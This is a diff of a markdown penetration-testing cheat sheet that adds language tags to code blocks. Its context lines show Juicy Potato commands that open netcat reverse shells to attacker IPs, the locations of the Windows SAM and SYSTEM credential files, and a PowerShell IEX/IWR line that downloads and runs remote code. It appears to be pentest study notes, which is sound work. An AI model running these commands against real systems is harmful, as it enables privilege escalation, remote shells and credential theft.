@@ -69,7 +69,7 @@ MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
 
 ### Juicy Potato
 
-```
+```cmd
 potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
 # PotatoNG https://github.com/antonioCoco/JuicyPotatoNG
 JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "nc.exe 192.168.49.131 21 -e c:\windows\system32\cmd.exe"
@@ -80,7 +80,7 @@ JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "nc.exe 192.168.49.13
 A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
 Passwords are LM & NTLM hashed\\
 
-```
+```cmd
 Default file location: 
 C:\Windows\System32\config\SAM
 C:\Windows\System32\config\SYSTEM
@@ -135,7 +135,7 @@ Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 
 #### PowerShell
 
-```
+```powershell
 Import-Module [filename].ps1
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
 IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
